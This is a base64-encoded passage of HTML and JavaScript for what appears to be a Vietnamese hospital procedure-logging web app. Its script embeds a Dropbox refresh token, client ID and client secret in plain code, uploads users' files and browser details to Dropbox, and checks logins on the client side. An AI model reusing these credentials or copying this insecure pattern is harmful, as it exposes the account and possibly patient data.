8L2xhYmVsPg0KICA8c2VsZWN0IGlkPSJmaWx0ZXJEYXRlIiBjbGFzcz0ibG9naW4taW5wdXQiIHN0eWxlPSJ3aWR0aDphdXRvOyI+PC9zZWxlY3Q+DQo8L2Rpdj4NCg0KICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIGhlcmItdGFibGUiPg0KICAgIDx0aGVhZD4NCiAgICAgIDx0cj4NCiAgICAgICAgPHRoPk5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICA8dGg+TmfDoHk8L3RoPg0KICAgICAgICANCiAgICAgICAgPHRoPktodW5nIGdp4budIHRy4buRbmcgYnXhu5VpIHPDoW5nPC90aD4NCiAgICAgICAgPHRoPktodW5nIGdp4budIHRy4buRbmcgYnXhu5VpIGNoaeG7gXU8L3RoPg0KICAgICAgPC90cj4NCiAgICA8L3RoZWFkPg0KICAgIDx0Ym9keSBpZD0iYXZhaWxhYmlsaXR5Qm9keSI+PC90Ym9keT4NCiAgPC90YWJsZT4NCjwvZGl2Pg0KPCEtLSBL4bq+VCBUSMOaQzogQuG6ok5HIEdJ4bucIFRS4buQTkcgVOG7qk5HIE5Hxq/hu5xJIC0tPg0KDQoNCg0KDQo8IS0tIE7DmlQgSEnhu4JOIFRI4buKIFRI4bumIFRIVeG6rFQgU+G6rkMgVEhV4buQQyAtLT4NCg0KDQogIA0KPCEtLSBC4bqiTkcgVEjhu6YgVEhV4bqsVCBT4bquQyBUSFXhu5BDIFRIQU5HIC0tPg0KPGRpdiBpZD0iaGVyYlByb2NlZHVyZVRhYmxlIiBzdHlsZT0iZGlzcGxheTogbm9uZTsgbWFyZ2luLXRvcDogMjBweDsiPg0KICA8ZGl2IGNsYXNzPSJtYWluYmxvayJzdHlsZT0ibWFyZ2luLWJvdHRvbTogMTBweDsiPg0KICAgIDxkaXY+DQogICAgPHNlbGVjdCBpZD0iaGVyYkRvY3RvckZpbHRlciIgY2xhc3M9ImxvZ2luLWlucHV0IiBzdHlsZT0id2lkdGg6YXV0bzsgbWFyZ2luLWxlZnQ6IDIwcHg7Ij4NCiAgICAgIDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6oyBiw6FjIHPEqTwvb3B0aW9uPg0KICAgIDwvc2VsZWN0Pg0KICAgIDxzZWxlY3QgaWQ9ImhlcmJEYXRlRmlsdGVyIiBjbGFzcz0ibG9naW4taW5wdXQiIHN0eWxlPSJ3aWR0aDphdXRvOyI+PC9zZWxlY3Q+DQogIDwvZGl2PjwvZGl2Pg0KDQo8IS0tIFTDk00gVOG6rlQgT1VUTElFUiAtLT4NCjxkaXYgaWQ9ImhlcmJPdXRsaWVyU3VtbWFyeSIgc3R5bGU9ImRpc3BsYXk6bm9uZTttYXJnaW46OHB4IDIwcHg7Zm9udC1zaXplOjE0cHgiPg0KICA8IS0tIG7hu5lpIGR1bmcgc+G6vSDEkcaw4bujYyBKUyBj4bqtcCBuaOG6rXQgLS0+DQo8L2Rpdj4NCiAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgPHRoZWFkPg0KICAgICAgPHRyPg0KICAgICAgICA8dGg+SOG7jSB0w6puIGLhu4duaCBuaMOibjwvdGg+DQogICAgICAgIDx0aD5UaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgPHRoPlRo4budaSBnaWFuPC90aD4NCiAgICAgICAgPHRoPk5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgPC90cj4NCiAgICA8L3RoZWFkPg0KICAgIDx0Ym9keSBpZD0iaGVyYlRhYmxlQm9keSI+PC90Ym9keT4NCiAgPC90YWJsZT4NCjwvZGl2Pg0KDQoNCjwhLS0gUE9QVVAgREFOSCBTw4FDSCBPVVRMSUVSIFPhuq5DIFRIVeG7kEMgVEhBTkcgLS0+DQo8ZGl2IGlkPSJoZXJiT3V0bGllck1vZGFsIiBzdHlsZT0iZGlzcGxheTpub25lO3Bvc2l0aW9uOmZpeGVkO2luc2V0OjA7ei1pbmRleDoxMTAwMCI+DQogIDxkaXYgaWQ9ImhlcmJPdXRsaWVyQmFja2Ryb3AiIHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTtpbnNldDowO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpIj48L2Rpdj4NCiAgPGRpdiByb2xlPSJkaWFsb2ciIGFyaWEtbW9kYWw9InRydWUiDQogICAgICAgc3R5bGU9InBvc2l0aW9uOmFic29sdXRlO3RvcDoxMCU7bGVmdDo1MCU7dHJhbnNmb3JtOnRyYW5zbGF0ZVgoLTUwJSk7DQogICAgICAgICAgICAgIG1heC13aWR0aDo3MDBweDttYXgtaGVpZ2h0Ojgwdmg7b3ZlcmZsb3c6YXV0bzsNCiAgICAgICAgICAgICAgYmFja2dyb3VuZDojZmZmO2NvbG9yOiMwMDA7cGFkZGluZzoyMHB4O2JvcmRlci1yYWRpdXM6OHB4Ow0KICAgICAgICAgICAgICBib3JkZXI6MnB4IHNvbGlkICNkMzJmMmY7Ym94LXNoYWRvdzowIDVweCAyMHB4IHJnYmEoMCwwLDAsMC4zKTtmb250LWZhbWlseTpJbnRlcixzYW5zLXNlcmlmIj4NCiAgICA8aDM+RGFuaCBzw6FjaCBjYSBraMOhYyDEkWEgc+G7kTwvaDM+DQogICAgPGRpdiBzdHlsZT0ibWFyZ2luOjEwcHggMDtmb250LXNpemU6MTNweCIgaWQ9ImhlcmJPdXRsaWVyTW9kYWxJbmZvIj48L2Rpdj4NCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIiBzdHlsZT0ibWFyZ2luLXRvcDoxMHB4Ij4NCiAgICAgIDx0aGVhZD4NCiAgICAgICAgPHRyPg0KICAgICAgICAgIDx0aD5I4buNIHTDqm4gYuG7h25oIG5ow6JuPC90aD4NCiAgICAgICAgICA8dGg+VGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgICA8dGg+VGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgIDx0aD5OZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgPC90cj4NCiAgICAgIDwvdGhlYWQ+DQogICAgICA8dGJvZHkgaWQ9ImhlcmJPdXRsaWVyTW9kYWxCb2R5Ij48L3Rib2R5Pg0KICAgIDwvdGFibGU+DQogICAgPGJyLz4NCiAgICA8YnV0dG9uIGNsYXNzPSJidG4iIHR5cGU9ImJ1dHRvbiIgaWQ9ImhlcmJPdXRsaWVyQ2xvc2VCdG4iPsSQw7NuZzwvYnV0dG9uPg0KICA8L2Rpdj4NCjwvZGl2Pg0KDQoNCg0KDQoNCg0KPGJyLz4NCjxici8+PGRpdiBpZD0iZXJyb3JTZWN0aW9uIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPg0KPGJyLz4NCjxoMyBpZD0iZXJyb3JTZWN0aW9uVGl0bGUiPkzhu5dpIE5o4bqtcCBTYWkgVGjhu51pIEdpYW48L2gzPg0KPGRpdiBpZD0ib3BlcmF0b3JGaWx0ZXJFcnJvciIgc3R5bGU9Im1hcmdpbi10b3A6IDE1cHg7IGRpc3BsYXk6IG5vbmU7Ij4NCjxsYWJlbCBmb3I9Im9wZXJhdG9yU2VsZWN0RXJyb3IiPkzhu41jIHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbjo8L2xhYmVsPg0KPHNlbGVjdCBjbGFzcz0ibG9naW4taW5wdXQiIGlkPSJvcGVyYXRvclNlbGVjdEVycm9yIj4NCjxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPg0KPC9zZWxlY3Q+DQo8L2Rpdj4NCjxkaXYgaWQ9ImVycm9yTG9nIj48L2Rpdj4NCjwvZGl2Pg0KPGJyLz4NCg0KPGRpdiBpZD0icmVzdWx0U2VjdGlvbiIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4NCjxoMyBpZD0icmVzdWx0U2VjdGlvblRpdGxlIj5UcsO5bmcgR2nhu508L2gzPiANCg0KPGRpdiBpZD0ib3BlcmF0b3JGaWx0ZXIiIHN0eWxlPSJtYXJnaW4tdG9wOiAxNXB4OyBkaXNwbGF5OiBub25lOyI+DQo8bGFiZWwgZm9yPSJvcGVyYXRvclNlbGVjdCI+TOG7jWMgdGhlbyBuZ8aw4budaSB0aOG7sWMgaGnhu4duOjwvbGFiZWw+DQo8c2VsZWN0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9Im9wZXJhdG9yU2VsZWN0Ij4NCjxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPg0KPC9zZWxlY3Q+DQo8L2Rpdj48YnIvPg0KDQo8dGFibGUgaWQ9InJlc3VsdFRhYmxlIj4NCjx0aGVhZD4NCjx0cj4NCjx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQo8dGg+PGkgY2xhc3M9ImZhciBmYS1jYWxlbmRhci1hbHQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nw6B5PC90aD4NCjx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQo8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCjx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBH4bujaSDDvSBnaeG7nTwvdGg+DQo8L3RyPg0KPC90aGVhZD4NCjx0Ym9keSBpZD0icmVzdWx0Qm9keSI+PC90Ym9keT4NCjwvdGFibGU+DQoNCg0KPC9kaXY+DQo8L2Rpdj4NCjwvZGl2Pg0KPHNjcmlwdD4NCi8vIFThuqNpIFhMU1ggY2jhu4kga2hpIGPhuqduDQphc3luYyBmdW5jdGlvbiBlbnN1cmVYTFNYKCkgew0KICBpZiAoIXdpbmRvdy5YTFNYKSB7DQogICAgYXdhaXQgaW1wb3J0KCdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy94bHN4LzAuMTguNS94bHN4LmZ1bGwubWluLmpzJyk7DQogIH0NCn0NCg0KLy8gVOG6o2kgRHJvcGJveCBTREsgY2jhu4kga2hpIGPhuqduDQphc3luYyBmdW5jdGlvbiBlbnN1cmVEcm9wYm94KCkgew0KICBpZiAoIXdpbmRvdy5Ecm9wYm94KSB7DQogICAgYXdhaXQgaW1wb3J0KCdodHRwczovL3VucGtnLmNvbS9kcm9wYm94L2Rpc3QvRHJvcGJveC1zZGsubWluLmpzJyk7DQogIH0NCn0NCg0KDQogICAgICAgIC8vIERhbmggc8OhY2ggdGjhu6cgdGh14bqtdA0KICAgICAgIGxldCBQUk9DRURVUkVTID0ge307DQoNCmFzeW5jIGZ1bmN0aW9uIGxvYWRQcm9jZWR1cmVzKCkgew0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vY2hhdV90aHV0aHVhdC50eHQnKTsNCiAgICAgICAgY29uc3QgdGV4dCA9IGF3YWl0IHJlcy50ZXh0KCk7DQogICAgICAgIFBST0NFRFVSRVMgPSBKU09OLnBhcnNlKHRleHQpOw0KICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICBhbGVydCgnS2jDtG5nIHRo4buDIHThuqNpIGRhbmggc8OhY2ggdGjhu6cgdGh14bqtdDogJyArIGVyci5tZXNzYWdlKTsNCiAgICAgICAgY29uc29sZS5lcnJvcihlcnIpOw0KICAgIH0NCn0NCg0KCQkNCg0KICAgICAgICAvLyBCaeG6v24gdG/DoG4gY+G7pWMNCiAgICAgICAgbGV0IGVycm9yTG9nID0gW107DQogICAgICAgIGxldCBjdXJyZW50VXNlciA9IG51bGw7DQogICAgICAgIGxldCBhbGxQcm9jZWR1cmVzID0gW107DQoNCg0KY29uc3QgRFJPUEJPWF9DT05GSUcgPSB7DQogICAgcmVmcmVzaFRva2VuOiAiY3RnQnZqM0lzdGNBQUFBQUFBQUFBVkZDc0lYSXV6X0NUUXBJbWFrY0M0Y3VRVjhEdW1rZmdEV0lzOFZHUHZGVCIsDQogICAgY2xpZW50SWQ6ICJ3OGF3ajJxeG8zYWl2NWUiLA0KICAgIGNsaWVudFNlY3JldDogInFrcW8xdTdhdHM3Ymw5ZyINCn07DQoNCmFzeW5jIGZ1bmN0aW9uIGdldEFjY2Vzc1Rva2VuKCkgew0KICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZmV0Y2goImh0dHBzOi8vYXBpLmRyb3Bib3hhcGkuY29tL29hdXRoMi90b2tlbiIsIHsNCiAgICAgICAgbWV0aG9kOiAiUE9TVCIsDQogICAgICAgIGhlYWRlcnM6IHsNCiAgICAgICAgICAgICJBdXRob3JpemF0aW9uIjogIkJhc2ljICIgKyBidG9hKGAke0RST1BCT1hfQ09ORklHLmNsaWVudElkfToke0RST1BCT1hfQ09ORklHLmNsaWVudFNlY3JldH1gKSwNCiAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIg0KICAgICAgICB9LA0KICAgICAgICBib2R5OiBgZ3JhbnRfdHlwZT1yZWZyZXNoX3Rva2VuJnJlZnJlc2hfdG9rZW49JHtEUk9QQk9YX0NPTkZJRy5yZWZyZXNoVG9rZW59YA0KICAgIH0pOw0KICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7DQogICAgcmV0dXJuIGRhdGEuYWNjZXNzX3Rva2VuOw0KfQ0KLy8gVOG6o2kgWExTWCBjaOG7iSBraGkgY+G6p24NCmFzeW5jIGZ1bmN0aW9uIGVuc3VyZVhMU1goKSB7DQogIGlmICghd2luZG93LlhMU1gpIHsNCiAgICBhd2FpdCBpbXBvcnQoJ2h0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL3hsc3gvMC4xOC41L3hsc3guZnVsbC5taW4uanMnKTsNCiAgfQ0KfQ0KDQovLyBU4bqjaSBEcm9wYm94IFNESyBjaOG7iSBraGkgY+G6p24NCmFzeW5jIGZ1bmN0aW9uIGVuc3VyZURyb3Bib3goKSB7DQogIGlmICghd2luZG93LkRyb3Bib3gpIHsNCiAgICBhd2FpdCBpbXBvcnQoJ2h0dHBzOi8vdW5wa2cuY29tL2Ryb3Bib3gvZGlzdC9Ecm9wYm94LXNkay5taW4uanMnKTsNCiAgfQ0KfQ0KYXN5bmMgZnVuY3Rpb24gdXBsb2FkVG9Ecm9wYm94KGZpbGUsIGtob2FWYWx1ZSwgbmdheVZhbHVlLCBzdGF0cyA9IHsgaGVyYjogMCwgdGltZTogMCwgY29uZmxpY3Q6IDAgfSkgew0KICBhd2FpdCBlbnN1cmVEcm9wYm94KCk7IC8vIMSR4bqjbSBi4bqjbyBjw7MgRHJvcGJveCBTREsNCiAgICBjb25zdCBhY2Nlc3NUb2tlbiA9IGF3YWl0IGdldEFjY2Vzc1Rva2VuKCk7DQogICAgY29uc3QgZGJ4ID0gbmV3IERyb3Bib3guRHJvcGJveCh7IGFjY2Vzc1Rva2VuIH0pOw0KDQogICAgY29uc3QgcGNOYW1lID0gbmF2aWdhdG9yLnVzZXJBZ2VudDsNCiAgICBjb25zdCBub3cgPSBuZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCd2aS1WTicpOw0KICAgIGNvbnN0IGZpbGVuYW1lID0gYCR7ZmlsZS5uYW1lLnJlcGxhY2UoL1wuW14vLl0rJC8sICIiKX1fJHtEYXRlLm5vdygpfS54bHN4YDsNCg0KICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZGJ4LmZpbGVzVXBsb2FkKHsNCiAgICAgICAgcGF0aDogYC90aHV0aHVhdC8ke2ZpbGVuYW1lfWAsDQogICAgICAgIGNvbnRlbnRzOiBmaWxlLA0KICAgICAgICBtb2RlOiAnYWRkJywNCiAgICAgICAgYXV0b3JlbmFtZTogdHJ1ZQ0KICAgIH0pOw0KDQogICAgLy8gR2hpIG1ldGFkYXRhIHbDoG8gZmlsZSBKU09OIHRydW5nIHTDom0gKGThuqFuZyB0ZXh0IGFwcGVuZCkNCiAgICBjb25zdCBtZXRhZGF0YSA9IHsNCiAgICAgICAgc3R0OiBEYXRlLm5vdygpLA0KICAgIGtob2E6IGtob2FWYWx1ZSwgICAgICAgIC8vIOKchSDEkcO6bmcgYmnhur9uDQogICAgbmdheTogbmdheVZhbHVlLCAgICAvLyDinIUgxJHDum5nIGJp4bq/bg0KICAgICAgICBsaW5rOiAiaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vaG9tZS90aHV0aHVhdD9wcmV2aWV3PSIgKyBlbmNvZGVVUklDb21wb25lbnQoZmlsZW5hbWUpLA0KICAgICAgICBwYzogcGNOYW1lLA0KICAgICAgICB0aW1lOiBub3csDQoJCWhlcmJfZXJyb3JzOiBOdW1iZXIoc3RhdHMuaGVyYikgfHwgMCwNCiAgICB0aW1lX2Vycm9yczogTnVtYmVyKHN0YXRzLnRpbWUpIHx8IDAsDQogICBjb25mbGljdF9lcnJvcnM6IE51bWJlcihzdGF0cy5jb25mbGljdCkgfHwgMA0KICAgIH07DQoNCiAgICBhd2FpdCBhcHBlbmREcm9wYm94TG9nKG1ldGFkYXRhKTsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gYXBwZW5kRHJvcGJveExvZyhsb2dJdGVtKSB7DQogICAgY29uc3QgYWNjZXNzVG9rZW4gPSBhd2FpdCBnZXRBY2Nlc3NUb2tlbigpOw0KICAgIGNvbnN0IGRieCA9IG5ldyBEcm9wYm94LkRyb3Bib3goeyBhY2Nlc3NUb2tlbiB9KTsNCg0KICAgIGNvbnN0IGxvZ1BhdGggPSAnL3RodXRodWF0L2xvZy5qc29uJzsNCiAgICBsZXQgbG9ncyA9IFtdOw0KDQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBkYnguZmlsZXNEb3dubG9hZCh7IHBhdGg6IGxvZ1BhdGggfSk7DQogICAgICAgIGNvbnN0IGJsb2IgPSByZXNwb25zZS5yZXN1bHQuZmlsZUJsb2I7IC8vIOKchSBkw7luZyAucmVzdWx0LmZpbGVCbG9iDQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCBibG9iLnRleHQoKTsNCiAgICAgICAgbG9ncyA9IEpTT04ucGFyc2UodGV4dCk7DQogICAgfSBjYXRjaCAoZSkgew0KICAgICAgICBjb25zb2xlLndhcm4oIktow7RuZyB0w6xtIHRo4bqleSBsb2cuanNvbiBjxakgaG/hurdjIGzhu5dpIMSR4buNYzoiLCBlKTsNCiAgICAgICAgbG9ncyA9IFtdOw0KICAgIH0NCg0KICAgIC8vIENow6huIG3hu5tpIG5o4bqldCBsw6puIMSR4bqndQ0KICAgIGxvZ3MudW5zaGlmdChsb2dJdGVtKTsNCg0KICAgIGF3YWl0IGRieC5maWxlc1VwbG9hZCh7DQogICAgICAgIHBhdGg6IGxvZ1BhdGgsDQogICAgICAgIGNvbnRlbnRzOiBKU09OLnN0cmluZ2lmeShsb2dzLCBudWxsLCAyKSwNCiAgICAgICAgbW9kZTogeyAnLnRhZyc6ICdvdmVyd3JpdGUnIH0sIC8vIOKchSBHaGkgxJHDqCBi4bqvdCBideG7mWMNCiAgICAgICAgYXV0b3JlbmFtZTogZmFsc2UNCiAgICB9KTsNCn0NCg0KDQphc3luYyBmdW5jdGlvbiBpbml0QWZ0ZXJMb2dpbigpIHsNCiAgYXdhaXQgUHJvbWlzZS5hbGwoWw0KICAgIGxvYWRQcm9jZWR1cmVzKCksDQogICAgbG9hZENvbmZsaWN0UnVsZXMoKQ0KICBdKTsNCn0NCg0KDQoNCiAgICAgICAgLy8gPT09PT09PT09PSBQSOG6pk4gxJDEgk5HIE5I4bqsUCA9PT09PT09PT09IC8vDQphc3luYyBmdW5jdGlvbiBjaGVja1NhdmVkTG9naW4oKSB7DQogICAgY29uc3Qgc2F2ZWRVc2VyID0gc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnbWVkVXNlcicpOw0KICAgIGlmIChzYXZlZFVzZXIpIHsNCiAgICAgICAgY3VycmVudFVzZXIgPSBzYXZlZFVzZXI7DQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpblNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFpbkNvbnRlbnQnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgaW5pdEFmdGVyTG9naW4oKTsgLy8gYXV0by1sb2dpbiBt4bubaSBsb2FkIGThu68gbGnhu4d1DQogICAgfQ0KfQ0KDQpsZXQgaXNMb2dpbkFjdGlvbiA9IGZhbHNlOyAvLyDinIUgVGjDqm0gZMOybmcgbsOgeQ0KbGV0IGFuYWx5emVQb3B1cFRpbWVyOyAvLyDinIUgVGjDqm0gZMOybmcgbsOgeQ0KYXN5bmMgZnVuY3Rpb24gY2hlY2tMb2dpbigpIHsNCiAgY29uc3QgYnRuTG9naW4gICA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkJ0bicpOw0KICBjb25zdCB1c2VybmFtZSAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJuYW1lSW5wdXQnKS52YWx1ZS50cmltKCk7DQogIGNvbnN0IHBhc3N3b3JkICAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLnZhbHVlLnRyaW0oKTsNCiAgY29uc3QgbG9naW5FcnJvciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkVycm9yJyk7DQoNCiAgYnRuTG9naW4uZGlzYWJsZWQgPSB0cnVlOw0KICBidG5Mb2dpbi5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1zcGlubmVyIGZhLXNwaW4iPjwvaT4gxJBhbmcgxJHEg25nIG5o4bqtcC4uLic7DQoNCiAgY29uc3QgcG9wdXAgICAgICAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgbGV0IGxvZ2luUG9wdXBTaG93biA9IGZhbHNlOw0KDQogIC8vIFNhdSAycyBraeG7g20gdHJhOiB24bqrbiDhu58gdHJhbmcgxJHEg25nIG5o4bqtcCAmIMSRYW5nIGxvYWRpbmc/DQpjb25zdCBzbG93TG9naW5UaW1lciA9IHNldFRpbWVvdXQoKCkgPT4gew0KICAgIGlmICghaXNMb2dpbkFjdGlvbikgcmV0dXJuOyAvLyDinIUgVGjDqm0gZMOybmcgbsOgeQ0KICAgIGNvbnN0IGxvZ2luU2VjdGlvblZpc2libGUgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJykuc3R5bGUuZGlzcGxheSAhPT0gJ25vbmUnOw0KICAgIGNvbnN0IHN0aWxsTG9hZGluZyA9IGJ0bkxvZ2luLmlubmVySFRNTC5pbmNsdWRlcygnxJBhbmcgxJHEg25nIG5o4bqtcCcpOw0KICAgIGlmIChsb2dpblNlY3Rpb25WaXNpYmxlICYmIHN0aWxsTG9hZGluZykgew0KICAgICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gYA0KICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLXNhdGVsbGl0ZS1kaXNoIGZhLXNwaW4iIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjojZTY3ZTIyO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPg0KICAgICAgICA8c3Ryb25nPsSQxrDhu51uZyB0cnV54buBbiBnacOhbiDEkW/huqFuPC9zdHJvbmc+PGJyLz48YnIvPg0KICAgICAgICBWdWkgbMOybmcgxJHhu6NpIHbDoGkgZ2nDonkgxJHhu4Mga2jhu59pIMSR4buZbmcgbcOheSBjaOG7pyBk4buxIHBow7JuZy4uLg0KICAgICAgYDsNCiAgICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzAlJzsNCiAgICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpKTsNCiAgICAgIGxvZ2luUG9wdXBTaG93biA9IHRydWU7DQogICAgbGV0IHBlcmNlbnQgPSAwOw0KcHJvZ3Jlc3NCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICd3aWR0aCAwLjJzIGxpbmVhcic7DQpjb25zdCBwcm9ncmVzc1RpbWVyID0gc2V0SW50ZXJ2YWwoKCkgPT4gew0KICAgIHBlcmNlbnQgKz0gMjsgLy8gdMSDbmcgbeG7l2kgbOG6p24gMiUNCiAgICBpZiAocGVyY2VudCA+IDEwMCkgew0KICAgICAgICBwZXJjZW50ID0gMTAwOw0KICAgICAgICBjbGVhckludGVydmFsKHByb2dyZXNzVGltZXIpOw0KICAgIH0NCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9IHBlcmNlbnQgKyAnJSc7DQp9LCA1MDApOyAvLyAxMDBtcyBj4bqtcCBuaOG6rXQgMSBs4bqnbg0KDQoJDQoJfQ0KICB9LCAyMDAwKTsNCg0KICB0cnkgew0KICAgIGNvbnN0IGFjY291bnRzID0gYXdhaXQgbG9hZEFjY291bnRzRnJvbVRYVCgpOw0KICAgIGlmIChhY2NvdW50c1t1c2VybmFtZV0gJiYgYWNjb3VudHNbdXNlcm5hbWVdID09PSBwYXNzd29yZCkgew0KICAgICAgY3VycmVudFVzZXIgPSB1c2VybmFtZTsNCiAgICAgIHNlc3Npb25TdG9yYWdlLnNldEl0ZW0oJ21lZFVzZXInLCB1c2VybmFtZSk7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWluQ29udGVudCcpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgbG9naW5FcnJvci5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QucmVtb3ZlKCdsb2dpbi1wYWdlJyk7DQoNCiAgICAgIGF3YWl0IGluaXRBZnRlckxvZ2luKCk7IC8vIGNo4buJIGxvYWQgc2F1IGtoaSBsb2dpbiB0aMOgbmggY8O0bmcNCiAgICB9IGVsc2Ugew0KICAgICAgbG9naW5FcnJvci5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICB9DQogIH0gY2F0Y2ggKGVycikgew0KICAgIGNvbnNvbGUuZXJyb3IoJ0zhu5dpIGtoaSDEkcSDbmcgbmjhuq1wOicsIGVycik7DQogICAgbG9naW5FcnJvci5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgfSBmaW5hbGx5IHsNCiAgICBjbGVhclRpbWVvdXQoc2xvd0xvZ2luVGltZXIpOw0KDQogICAgLy8gTuG6v3UgcG9wdXAgZG8gbG9naW4gbeG7nyB0aMOsIMSRw7NuZw0KICAgIGlmIChsb2dpblBvcHVwU2hvd24gJiYgcG9wdXApIHsNCiAgICAgIHBvcHVwLmNsYXNzTGlzdC5yZW1vdmUoJ3Nob3cnKTsNCiAgICAgIHNldFRpbWVvdXQoKCkgPT4geyBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOyB9LCA0MDApOw0KICAgIH0NCg0KICAgIGJ0bkxvZ2luLmRpc2FibGVkID0gZmFsc2U7DQogICAgYnRuTG9naW4uaW5uZXJIVE1MID0gJ8SQxINuZyBuaOG6rXAnOw0KICB9DQp9DQoNCg0KICAgICAgICBmdW5jdGlvbiBsb2dvdXQoKSB7DQogICAgICAgICAgICBjdXJyZW50VXNlciA9IG51bGw7DQogICAgICAgICAgICBzZXNzaW9uU3RvcmFnZS5yZW1vdmVJdGVtKCdtZWRVc2VyJyk7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAg